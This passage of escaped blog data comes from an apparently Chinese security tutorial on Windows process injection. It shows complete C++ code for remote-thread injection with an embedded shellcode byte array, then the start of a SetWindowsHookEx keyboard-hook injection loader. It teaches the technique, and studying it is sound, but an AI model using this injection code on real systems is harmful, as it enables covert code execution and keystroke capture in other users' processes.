class=\"built_in\">printf</span>(<span class=\"string\">&quot;[-] CreateRemoteThread faild\\r\\n&quot;</span>);</span><br><span class=\"line\">\t\t<span class=\"built_in\">CloseHandle</span>(hProcess);</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;[+] CreateRemoteThread success\\r\\n&quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">InjectShellcode</span><span class=\"params\">(DWORD dwPId)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">unsigned</span> <span class=\"keyword\">char</span> hexData[<span class=\"number\">404</span>] = &#123;</span><br><span class=\"line\">\t\t<span class=\"number\">0xE9</span>, <span class=\"number\">0x0B</span>, <span class=\"number\">0x01</span>, <span class=\"number\">0x00</span>, <span class=\"number\">0x00</span>, <span class=\"number\">0xCC</span>, <span class=\"number\">0xCC</span>, <span class=\"number\">0xCC</span>, <span class=\"number\">0x48</span>, <span class=\"number\">0x8B</span>, <span class=\"number\">0xC4</span>, <span class=\"number\">0x48</span>, <span class=\"number\">0x89</span>, <span class=\"number\">0x58</span>, <span class=\"number\">0x08</span>, <span class=\"number\">0x48</span>,</span><br><span class=\"line\">\t\t<span class=\"number\">0x89</span>, <span class=\"number\">0x68</span>, <span class=\"number\">0x10</span>, <span class=\"number\">0x48</span>, <span class=\"number\">0x89</span>, <span class=\"number\">0x70</span>, <span class=\"number\">0x18</span>, <span class=\"number\">0x48</span>, <span class=\"number\">0x89</span>, <span class=\"number\">0x78</span>, <span class=\"number\">0x20</span>, <span class=\"number\">0x41</span>, <span class=\"number\">0x56</span>, <span class=\"number\">0x41</span>, <span class=\"number\">0x57</span>, <span class=\"number\">0x65</span>,</span><br><span class=\"line\">\t\t<span class=\"number\">0x48</span>, <span class=\"number\">0x8B</span>, <span class=\"number\">0x04</span>, <span class=\"number\">0x25</span>, <span class=\"number\">0x60</span>, <span class=\"number\">0x00</span>, <span class=\"number\">0x00</span>, <span class=\"number\">0x00</span>, <span class=\"number\">0x44</span>, <span class=\"number\">0x8B</span>, <span class=\"number\">0xF9</span>, <span class=\"number\">0x48</span>, <span class=\"number\">0x8B</span>, <span class=\"number\">0x50</span>, <span class=\"number\">0x18</span>, <span class=\"number\">0x4C</span>,</span><br><span class=\"line\">\t\t<span class=\"number\">0x8B</span>, <span class=\"number\">0x72</span>, <span class=\"number\">0x20</span>, <span class=\"number\">0x4D</span>, <span class=\"number\">0x8B</span>, <span class=\"number\">0xC6</span>, <span class=\"number\">0x4D</span>, <span class=\"number\">0x8B</span>, <span class=\"number\">0x48</span>, <span class=\"number\">0x20</span>, <span class=\"number\">0x4D</span>, <span class=\"number\">0x8B</span>, <span class=\"number\">0x00</span>, <span class=\"number\">0x4D</span>, <span class=\"number\">0x85</span>, <span class=\"number\">0xC9</span>,</span><br><span class=\"line\">\t\t<span class=\"number\">0x0F</span>, <span class=\"number\">0x84</span>, <span class=\"number\">0x89</span>, <span class=\"number\">0x00</span>, <span class=\"number\">0x00</span>, <span class=\"number\">0x00</span>, <span class=\"number\">0x49</span>, <span class=\"number\">0x63</span>, <span class=\"number\">0x41</span>, <span class=\"number\">0x3C</span>, <span class=\"number\">0x42</span>, <span class=\"number\">0x8B</span>, <span class=\"number\">0x8C</span>, <span class=\"number\">0x08</span>, <span class=\"number\">0x88</span>, <span class=\"number\">0x00</span>,</span><br><span class=\"line\">\t\t<span class=\"number\">0x00</span>, <span class=\"number\">0x00</span>, <span class=\"number\">0x85</span>, <span class=\"number\">0xC9</span>, <span class=\"number\">0x74</span>, <span class=\"number\">0x79</span>, <span class=\"number\">0x4D</span>, <span class=\"number\">0x8D</span>, <span class=\"number\">0x14</span>, <span class=\"number\">0x09</span>, <span class=\"number\">0x41</span>, <span class=\"number\">0x8B</span>, <span class=\"number\">0x52</span>, <span class=\"number\">0x0C</span>, <span class=\"number\">0x49</span>, <span class=\"number\">0x03</span>,</span><br><span class=\"line\">\t\t<span class=\"number\">0xD1</span>, <span class=\"number\">0x33</span>, <span class=\"number\">0xFF</span>, <span class=\"number\">0xEB</span>, <span class=\"number\">0x16</span>, <span class=\"number\">0xC1</span>, <span class=\"number\">0xCF</span>, <span class=\"number\">0x0D</span>, <span class=\"number\">0x41</span>, <span class=\"number\">0x0F</span>, <span class=\"number\">0xBE</span>, <span class=\"number\">0xCB</span>, <span class=\"number\">0x41</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0xFB</span>, <span class=\"number\">0x61</span>,</span><br><span class=\"line\">\t\t<span class=\"number\">0x8D</span>, <span class=\"number\">0x41</span>, <span class=\"number\">0xE0</span>, <span class=\"number\">0x0F</span>, <span class=\"number\">0x4C</span>, <span class=\"number\">0xC1</span>, <span class=\"number\">0x03</span>, <span class=\"number\">0xF8</span>, <span class=\"number\">0x48</span>, <span class=\"number\">0xFF</span>, <span class=\"number\">0xC2</span>, <span class=\"number\">0x44</span>, <span class=\"number\">0x8A</span>, <span class=\"number\">0x1A</span>, <span class=\"number\">0x45</span>, <span class=\"number\">0x84</span>,</span><br><span class=\"line\">\t\t<span class=\"number\">0xDB</span>, <span class=\"number\">0x75</span>, <span class=\"number\">0xE2</span>, <span class=\"number\">0x41</span>, <span class=\"number\">0x8B</span>, <span class=\"number\">0x52</span>, <span class=\"number\">0x20</span>, <span class=\"number\">0x45</span>, <span class=\"number\">0x33</span>, <span class=\"number\">0xDB</span>, <span class=\"number\">0x49</span>, <span class=\"number\">0x03</span>, <span class=\"number\">0xD1</span>, <span class=\"number\">0x45</span>, <span class=\"number\">0x39</span>, <span class=\"number\">0x5A</span>,</span><br><span class=\"line\">\t\t<span class=\"number\">0x18</span>, <span class=\"number\">0x76</span>, <span class=\"number\">0x3C</span>, <span class=\"number\">0x8B</span>, <span class=\"number\">0x1A</span>, <span class=\"number\">0x49</span>, <span class=\"number\">0x03</span>, <span class=\"number\">0xD9</span>, <span class=\"number\">0x33</span>, <span class=\"number\">0xF6</span>, <span class=\"number\">0xEB</span>, <span class=\"number\">0x16</span>, <span class=\"number\">0xC1</span>, <span class=\"number\">0xCE</span>, <span class=\"number\">0x0D</span>, <span class=\"number\">0x40</span>,</span><br><span class=\"line\">\t\t<span class=\"number\">0x0F</span>, <span class=\"number\">0xBE</span>, <span class=\"number\">0xCD</span>, <span class=\"number\">0x40</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0xFD</span>, <span class=\"number\">0x61</span>, <span class=\"number\">0x8D</span>, <span class=\"number\">0x41</span>, <span class=\"number\">0xE0</span>, <span class=\"number\">0x0F</span>, <span class=\"number\">0x4C</span>, <span class=\"number\">0xC1</span>, <span class=\"number\">0x03</span>, <span class=\"number\">0xF0</span>, <span class=\"number\">0x48</span>,</span><br><span class=\"line\">\t\t<span class=\"number\">0xFF</span>, <span class=\"number\">0xC3</span>, <span class=\"number\">0x40</span>, <span class=\"number\">0x8A</span>, <span class=\"number\">0x2B</span>, <span class=\"number\">0x40</span>, <span class=\"number\">0x84</span>, <span class=\"number\">0xED</span>, <span class=\"number\">0x75</span>, <span class=\"number\">0xE2</span>, <span class=\"number\">0x8D</span>, <span class=\"number\">0x04</span>, <span class=\"number\">0x3E</span>, <span class=\"number\">0x44</span>, <span class=\"number\">0x3B</span>, <span class=\"number\">0xF8</span>,</span><br><span class=\"line\">\t\t<span class=\"number\">0x74</span>, <span class=\"number\">0x31</span>, <span class=\"number\">0x41</span>, <span class=\"number\">0xFF</span>, <span class=\"number\">0xC3</span>, <span class=\"number\">0x48</span>, <span class=\"number\">0x83</span>, <span class=\"number\">0xC2</span>, <span class=\"number\">0x04</span>, <span class=\"number\">0x45</span>, <span class=\"number\">0x3B</span>, <span class=\"number\">0x5A</span>, <span class=\"number\">0x18</span>, <span class=\"number\">0x72</span>, <span class=\"number\">0xC4</span>, <span class=\"number\">0x4D</span>,</span><br><span class=\"line\">\t\t<span class=\"number\">0x3B</span>, <span class=\"number\">0xC6</span>, <span class=\"number\">0x0F</span>, <span class=\"number\">0x85</span>, <span class=\"number\">0x5E</span>, <span class=\"number\">0xFF</span>, <span class=\"number\">0xFF</span>, <span class=\"number\">0xFF</span>, <span class=\"number\">0x33</span>, <span class=\"number\">0xC0</span>, <span class=\"number\">0x48</span>, <span class=\"number\">0x8B</span>, <span class=\"number\">0x5C</span>, <span class=\"number\">0x24</span>, <span class=\"number\">0x18</span>, <span class=\"number\">0x48</span>,</span><br><span class=\"line\">\t\t<span class=\"number\">0x8B</span>, <span class=\"number\">0x6C</span>, <span class=\"number\">0x24</span>, <span class=\"number\">0x20</span>, <span class=\"number\">0x48</span>, <span class=\"number\">0x8B</span>, <span class=\"number\">0x74</span>, <span class=\"number\">0x24</span>, <span class=\"number\">0x28</span>, <span class=\"number\">0x48</span>, <span class=\"number\">0x8B</span>, <span class=\"number\">0x7C</span>, <span class=\"number\">0x24</span>, <span class=\"number\">0x30</span>, <span class=\"number\">0x41</span>, <span class=\"number\">0x5F</span>,</span><br><span class=\"line\">\t\t<span class=\"number\">0x41</span>, <span class=\"number\">0x5E</span>, <span class=\"number\">0xC3</span>, <span class=\"number\">0x41</span>, <span class=\"number\">0x8B</span>, <span class=\"number\">0x4A</span>, <span class=\"number\">0x24</span>, <span class=\"number\">0x49</span>, <span class=\"number\">0x03</span>, <span class=\"number\">0xC9</span>, <span class=\"number\">0x46</span>, <span class=\"number\">0x0F</span>, <span class=\"number\">0xB7</span>, <span class=\"number\">0x04</span>, <span class=\"number\">0x59</span>, <span class=\"number\">0x41</span>,</span><br><span class=\"line\">\t\t<span class=\"number\">0x8B</span>, <span class=\"number\">0x4A</span>, <span class=\"number\">0x1C</span>, <span class=\"number\">0x49</span>, <span class=\"number\">0x03</span>, <span class=\"number\">0xC9</span>, <span class=\"number\">0x42</span>, <span class=\"number\">0x8B</span>, <span class=\"number\">0x04</span>, <span class=\"number\">0x81</span>, <span class=\"number\">0x49</span>, <span class=\"number\">0x03</span>, <span class=\"number\">0xC1</span>, <span class=\"number\">0xEB</span>, <span class=\"number\">0xCB</span>, <span class=\"number\">0xCC</span>,</span><br><span class=\"line\">\t\t<span class=\"number\">0x40</span>, <span class=\"number\">0x55</span>, <span class=\"number\">0x48</span>, <span class=\"number\">0x8B</span>, <span class=\"number\">0xEC</span>, <span class=\"number\">0x48</span>, <span class=\"number\">0x83</span>, <span class=\"number\">0xEC</span>, <span class=\"number\">0x50</span>, <span class=\"number\">0x33</span>, <span class=\"number\">0xC0</span>, <span class=\"number\">0xC7</span>, <span class=\"number\">0x45</span>, <span class=\"number\">0xD0</span>, <span class=\"number\">0x75</span>, <span class=\"number\">0x73</span>,</span><br><span class=\"line\">\t\t<span class=\"number\">0x65</span>, <span class=\"number\">0x72</span>, <span class=\"number\">0xB9</span>, <span class=\"number\">0x8D</span>, <span class=\"number\">0x10</span>, <span class=\"number\">0xB7</span>, <span class=\"number\">0xF8</span>, <span class=\"number\">0x88</span>, <span class=\"number\">0x45</span>, <span class=\"number\">0xDA</span>, <span class=\"number\">0x88</span>, <span class=\"number\">0x45</span>, <span class=\"number\">0xEA</span>, <span class=\"number\">0x88</span>, <span class=\"number\">0x45</span>, <span class=\"number\">0xFC</span>,</span><br><span class=\"line\">\t\t<span class=\"number\">0xC7</span>, <span class=\"number\">0x45</span>, <span class=\"number\">0xD4</span>, <span class=\"number\">0x33</span>, <span class=\"number\">0x32</span>, <span class=\"number\">0x2E</span>, <span class=\"number\">0x64</span>, <span class=\"number\">0x66</span>, <span class=\"number\">0xC7</span>, <span class=\"number\">0x45</span>, <span class=\"number\">0xD8</span>, <span class=\"number\">0x6C</span>, <span class=\"number\">0x6C</span>, <span class=\"number\">0xC7</span>, <span class=\"number\">0x45</span>, <span class=\"number\">0xE0</span>,</span><br><span class=\"line\">\t\t<span class=\"number\">0x53</span>, <span class=\"number\">0x68</span>, <span class=\"number\">0x65</span>, <span class=\"number\">0x6C</span>, <span class=\"number\">0xC7</span>, <span class=\"number\">0x45</span>, <span class=\"number\">0xE4</span>, <span class=\"number\">0x6C</span>, <span class=\"number\">0x53</span>, <span class=\"number\">0x74</span>, <span class=\"number\">0x64</span>, <span class=\"number\">0x66</span>, <span class=\"number\">0xC7</span>, <span class=\"number\">0x45</span>, <span class=\"number\">0xE8</span>, <span class=\"number\">0x69</span>,</span><br><span class=\"line\">\t\t<span class=\"number\">0x6F</span>, <span class=\"number\">0xC7</span>, <span class=\"number\">0x45</span>, <span class=\"number\">0xF0</span>, <span class=\"number\">0x48</span>, <span class=\"number\">0x65</span>, <span class=\"number\">0x6C</span>, <span class=\"number\">0x6C</span>, <span class=\"number\">0xC7</span>, <span class=\"number\">0x45</span>, <span class=\"number\">0xF4</span>, <span class=\"number\">0x6F</span>, <span class=\"number\">0x20</span>, <span class=\"number\">0x57</span>, <span class=\"number\">0x6F</span>, <span class=\"number\">0xC7</span>,</span><br><span class=\"line\">\t\t<span class=\"number\">0x45</span>, <span class=\"number\">0xF8</span>, <span class=\"number\">0x72</span>, <span class=\"number\">0x6C</span>, <span class=\"number\">0x64</span>, <span class=\"number\">0x21</span>, <span class=\"number\">0xE8</span>, <span class=\"number\">0x9D</span>, <span class=\"number\">0xFE</span>, <span class=\"number\">0xFF</span>, <span class=\"number\">0xFF</span>, <span class=\"number\">0x48</span>, <span class=\"number\">0x8D</span>, <span class=\"number\">0x4D</span>, <span class=\"number\">0xD0</span>, <span class=\"number\">0xFF</span>,</span><br><span class=\"line\">\t\t<span class=\"number\">0xD0</span>, <span class=\"number\">0xB9</span>, <span class=\"number\">0x9E</span>, <span class=\"number\">0x78</span>, <span class=\"number\">0x78</span>, <span class=\"number\">0xCD</span>, <span class=\"number\">0xE8</span>, <span class=\"number\">0x8D</span>, <span class=\"number\">0xFE</span>, <span class=\"number\">0xFF</span>, <span class=\"number\">0xFF</span>, <span class=\"number\">0x45</span>, <span class=\"number\">0x33</span>, <span class=\"number\">0xC9</span>, <span class=\"number\">0x4C</span>, <span class=\"number\">0x8D</span>,</span><br><span class=\"line\">\t\t<span class=\"number\">0x45</span>, <span class=\"number\">0xE0</span>, <span class=\"number\">0x48</span>, <span class=\"number\">0x8D</span>, <span class=\"number\">0x55</span>, <span class=\"number\">0xF0</span>, <span class=\"number\">0x33</span>, <span class=\"number\">0xC9</span>, <span class=\"number\">0xFF</span>, <span class=\"number\">0xD0</span>, <span class=\"number\">0x33</span>, <span class=\"number\">0xC0</span>, <span class=\"number\">0x48</span>, <span class=\"number\">0x83</span>, <span class=\"number\">0xC4</span>, <span class=\"number\">0x50</span>,</span><br><span class=\"line\">\t\t<span class=\"number\">0x5D</span>, <span class=\"number\">0xC3</span>, <span class=\"number\">0xCC</span>, <span class=\"number\">0xCC</span></span><br><span class=\"line\">\t&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">\tHANDLE hProcess = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">\tLPVOID lpRemoteShellcodeAddr = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">\tBOOL bRet = <span class=\"literal\">false</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">size_t</span> nNumberOfBytesWritten;</span><br><span class=\"line\"></span><br><span class=\"line\">\thProcess = <span class=\"built_in\">OpenProcess</span>(PROCESS_ALL_ACCESS, FALSE, dwPId);</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (!hProcess)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;[-] OpenProcess faild\\r\\n&quot;</span>);</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;[+] OpenProcess success, pid:%d\\r\\n&quot;</span>, dwPId);</span><br><span class=\"line\"></span><br><span class=\"line\">\tlpRemoteShellcodeAddr = <span class=\"built_in\">VirtualAllocEx</span>(</span><br><span class=\"line\">\t\thProcess,</span><br><span class=\"line\">\t\t<span class=\"literal\">NULL</span>,</span><br><span class=\"line\">\t\t<span class=\"number\">0x1000</span>,</span><br><span class=\"line\">\t\tMEM_RESERVE | MEM_COMMIT,</span><br><span class=\"line\">\t\tPAGE_EXECUTE_READWRITE</span><br><span class=\"line\">\t);</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (!lpRemoteShellcodeAddr)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;[-] VirtualAllocEx faild\\r\\n&quot;</span>);</span><br><span class=\"line\">\t\t<span class=\"built_in\">CloseHandle</span>(hProcess);</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;[+] VirtualAllocEx success, lpRemoteDllBuff: %p\\r\\n&quot;</span>, lpRemoteShellcodeAddr);</span><br><span class=\"line\"></span><br><span class=\"line\">\tbRet = <span class=\"built_in\">WriteProcessMemory</span>(</span><br><span class=\"line\">\t\thProcess,</span><br><span class=\"line\">\t\tlpRemoteShellcodeAddr,</span><br><span class=\"line\">\t\thexData,</span><br><span class=\"line\">\t\t<span class=\"built_in\"><span class=\"keyword\">sizeof</span></span>(hexData),</span><br><span class=\"line\">\t\t&amp;nNumberOfBytesWritten</span><br><span class=\"line\">\t);</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (!lpRemoteShellcodeAddr)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;[-] WriteProcessMemory faild\\r\\n&quot;</span>);</span><br><span class=\"line\">\t\t<span class=\"built_in\">CloseHandle</span>(hProcess);</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;[+] WriteProcessMemory success, nNumberOfBytesWritten: %zd\\r\\n&quot;</span>, nNumberOfBytesWritten);</span><br><span class=\"line\"></span><br><span class=\"line\">\tHANDLE hThread = <span class=\"built_in\">CreateRemoteThread</span>(</span><br><span class=\"line\">\t\thProcess,</span><br><span class=\"line\">\t\t<span class=\"literal\">NULL</span>,</span><br><span class=\"line\">\t\t<span class=\"number\">0</span>,</span><br><span class=\"line\">\t\t(LPTHREAD_START_ROUTINE)lpRemoteShellcodeAddr,</span><br><span class=\"line\">\t\t<span class=\"literal\">NULL</span>,</span><br><span class=\"line\">\t\t<span class=\"number\">0</span>,</span><br><span class=\"line\">\t\t<span class=\"literal\">NULL</span></span><br><span class=\"line\">\t);</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (!hThread)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;[-] CreateRemoteThread faild\\r\\n&quot;</span>);</span><br><span class=\"line\">\t\t<span class=\"built_in\">CloseHandle</span>(hProcess);</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;[+] CreateRemoteThread success\\r\\n&quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">(<span class=\"keyword\">int</span> argc, <span class=\"keyword\">char</span>** argv)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (argc != <span class=\"number\">3</span>) &#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;useage: ReomteThreadInjection.exe &lt;pid&gt; &lt;dll/shellcode&gt;\\r\\n&quot;</span>);</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> <span class=\"number\">-1</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tDWORD dwPId = <span class=\"built_in\">atol</span>(argv[<span class=\"number\">1</span>]);</span><br><span class=\"line\">\tCHAR* lpMethod = argv[<span class=\"number\">2</span>];</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (!<span class=\"built_in\">lstrcmp</span>(<span class=\"string\">&quot;dll&quot;</span>, lpMethod))</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">InjectDll</span>(dwPId);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (!<span class=\"built_in\">lstrcmp</span>(<span class=\"string\">&quot;shellcode&quot;</span>, lpMethod))</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">InjectShellcode</span>(dwPId);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">else</span> </span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;[-] Method error\\r\\n&quot;</span>);</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> <span class=\"number\">-1</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"built_in\">system</span>(<span class=\"string\">&quot;pause&quot;</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"0x5-参考\"><a href=\"#0x5-参考\" class=\"headerlink\" title=\"0x5 参考\"></a>0x5 参考</h2><blockquote>\n<p><a href=\"https://www.cnblogs.com/LittleHann/p/6336950.html\">https://www.cnblogs.com/LittleHann/p/6336950.html</a></p>\n</blockquote>\n","categories":["Security"],"tags":["windows"]},{"title":"Windows进程注入方法-Windows钩子注入","url":"/WindowsHookInjection/","content":"<h1 id=\"WindowsHookInjection\"><a href=\"#WindowsHookInjection\" class=\"headerlink\" title=\"WindowsHookInjection\"></a>WindowsHookInjection</h1><h1 id=\"0x1-介绍\"><a href=\"#0x1-介绍\" class=\"headerlink\" title=\"0x1 介绍\"></a>0x1 介绍</h1><p>钩子(Hook)，是Windows消息处理机制的一个平台，应用程序可以在上面设置子程以监视指定窗口的某种消息，而且所监视的窗口可以是其他进程所创建的。当消息到达后，在目标窗口处理函数之前处理该消息。</p>\n<span id=\"more\"></span>\n\n<p>因此，钩子机制允许应用程序截获处理window消息或特定事件。</p>\n<p>底层上看，钩子实际上是一个处理消息的程序段，通过系统调用，把它挂入系统。每当特定的消息发出，在没有到达目的窗口前，钩子程序就先捕获该消息，亦即钩子函数先得到控制权。这时钩子函数即可以加工处理（改变）该消息，也可以不作处理而继续传递该消息，还可以强制结束消息的传递。</p>\n<h1 id=\"0x2-原理\"><a href=\"#0x2-原理\" class=\"headerlink\" title=\"0x2 原理\"></a>0x2 原理</h1><p>核心是使用挂钩API：<code>SetWindowsHookEx</code>， 在微软的msdn上有详细介绍：</p>\n<blockquote>\n<h3 id=\"SetWindowsHookEx\"><a href=\"#SetWindowsHookEx\" class=\"headerlink\" title=\"SetWindowsHookEx\"></a>SetWindowsHookEx</h3><p>The <strong>SetWindowsHookEx</strong> function installs an application-defined hook  procedure into a hook chain. You would install a hook procedure to monitor the  system for certain types of events. These events are associated either with a  specific thread or with all threads in the same desktop as the calling thread. </p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\">&gt;<span class=\"function\">HHOOK <span class=\"title\">SetWindowsHookEx</span><span class=\"params\">(</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">&gt;<span class=\"keyword\">int</span> idHook,        <span class=\"comment\">// hook type</span></span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">&gt;HOOKPROC lpfn,     <span class=\"comment\">// hook procedure</span></span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">&gt;HINSTANCE hMod,    <span class=\"comment\">// handle to application instance</span></span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">&gt;DWORD dwThreadId   <span class=\"comment\">// thread identifier);</span></span></span></span><br></pre></td></tr></table></figure>\n\n<h4 id=\"Parameters\"><a href=\"#Parameters\" class=\"headerlink\" title=\"Parameters\"></a>Parameters</h4><ul>\n<li><em>idHook</em> </li>\n</ul>\n<p>[in] Specifies the type of hook procedure to be installed. This parameter  can be one of the following values. </p>\n<ul>\n<li><em>lpfn</em> </li>\n</ul>\n<p>[in] Pointer to the hook procedure. If the <em>dwThreadId</em> parameter is  zero or specifies the identifier of a thread created by a different process, the  <em>lpfn</em> parameter must point to a hook procedure in a dynamic-link library  (DLL). Otherwise, <em>lpfn</em> can point to a hook procedure in the code  associated with the current process. </p>\n<ul>\n<li><em>hMod</em> </li>\n</ul>\n<p>[in] Handle to the DLL containing the hook procedure pointed to by the  <em>lpfn</em> parameter. The <em>hMod</em> parameter must be set to NULL if the  <em>dwThreadId</em> parameter specifies a thread created by the current process  and if the hook procedure is within the code associated with the current  process. </p>\n<ul>\n<li><em>dwThreadId</em> </li>\n</ul>\n<p>[in] Specifies the identifier of the thread with which the hook procedure is  to be associated. If this parameter is zero, the hook procedure is associated  with all existing threads running in the same desktop as the calling thread. </p>\n</blockquote>\n<p>钩子分为局部钩子和全局钩子：</p>\n<ul>\n<li>局部钩子：hMod设为NULL，dwThreadId=本线程Id</li>\n<li>全局钩子：hMod为回调函数所在模块句柄</li>\n</ul>\n<p>如果需要对某进程注入，需要使用全局钩子，需要创建一个dll，hMod为dll的模块句柄，Hook的回调函数放在dll中，线程Id为指定进程的主线程Id，线程Id为0时则会钩系统范围内所有进程的窗口进程</p>\n<h1 id=\"0x3-代码\"><a href=\"#0x3-代码\" class=\"headerlink\" title=\"0x3 代码\"></a>0x3 代码</h1><p>exe部分：</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;windows.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdlib.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">typedef</span> <span class=\"title\">LRESULT</span> <span class=\"params\">(CALLBACK *pHookFun)</span><span class=\"params\">(<span class=\"keyword\">int</span>, WPARAM, LPARAM)</span></span>;</span><br><span class=\"line\"></span><br><span class=\"line\">pHookFun HookKeyboardProc = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\tHMODULE hMod = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">\thMod = ::<span class=\"built_in\">LoadLibrary</span>(<span class=\"string\">&quot;HookDll.dll&quot;</span>);</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (!hMod) &#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">OutputDebugString</span>(<span class=\"string\">&quot;[-] LoadLibrary(\\&quot;HookDll.dll\\&quot;) faild&quot;</span>);</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> <span class=\"number\">-1</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t::<span class=\"built_in\">OutputDebugString</span>(<span class=\"string\">&quot;[+] LoadLibrary(\\&quot;HookDll.dll\\&quot;) success&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">\tHHOOK* g_pHook = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">\tg_pHook = (HHOOK*)::<span class=\"built_in\">GetProcAddress</span>(hMod, <span class=\"string\">&quot;g_hook&quot;</span>);</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (!g_pHook) &#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">OutputDebugString</span>(<span class=\"string\">&quot;[-] GetProcAddress(hMod, \\&quot;g_hook\\&quot;) faild&quot;</span>);</span><br><span class=\"line\">\t\t<span class=\"built_in\">FreeLibrary</span>(hMod);</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> <span class=\"number\">-1</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t::<span class=\"built_in\">OutputDebugString</span>(<span class=\"string\">&quot;[+] GetProcAddress(hMod, \\&quot;g_hook\\&quot;) success&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">\tHookKeyboardProc = (pHookFun)::<span class=\"built_in\">GetProcAddress</span>(hMod, <span class=\"string\">&quot;HookKeyboardProc&quot;</span>);</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (!HookKeyboardProc) &#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">OutputDebugString</span>(<span class=\"string\">&quot;[-] GetProcAddress(hMod, \\&quot;HookKeyboardProc\\&quot;) faild&quot;</span>);</span><br><span class=\"line\">\t\t<span class=\"built_in\">FreeLibrary</span>(hMod);</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> <span class=\"number\">-1</span>;</span><br><span class=\"line\">\t&#125;</span><br><span 